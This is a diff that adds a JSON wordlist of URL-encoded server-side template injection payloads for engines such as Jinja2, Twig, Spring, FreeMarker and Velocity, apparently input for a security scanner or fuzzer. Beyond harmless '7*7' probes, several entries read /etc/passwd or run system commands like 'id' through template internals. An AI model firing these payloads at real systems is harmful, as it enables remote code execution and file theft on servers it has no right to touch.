@@ -1,0 +1,24 @@
+{
+  "ssti": [
+    "%7B%7B7%2A7%7D%7D",
+    "%7B%7B7%2A%277%27%7D%7D",
+    "%24%7B7%2A7%7D",
+    "%23%7B7%2A7%7D",
+    "%3C%25%3D%207%2A7%20%25%3E",
+    "%7B%7Bconfig%7D%7D",
+    "%7B%7Bself%7D%7D",
+    "%7B%7Bself.__class__.__mro__%7D%7D",
+    "%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%7D%7D",
+    "%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%27%2Fetc%2Fpasswd%27%29.read%28%29%7D%7D",
+    "%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D",
+    "%7B%7B_self.env.registerUndefinedFilterCallback%28%27exec%27%29%7D%7D%7B%7B_self.env.getFilter%28%27id%27%29%7D%7D",
+    "%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D",
+    "%2A%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D",
+    "%40%281%2B1%29",
+    "%7B%7B%27a%27.toUpperCase%28%29%7D%7D",
+    "%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D",
+    "%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bex%28%22id%22%29%7D",
+    "%23set%28%24x%3D7%2A7%29",
+    "%23evaluate%28%22id%22%29"
+  ]
+}
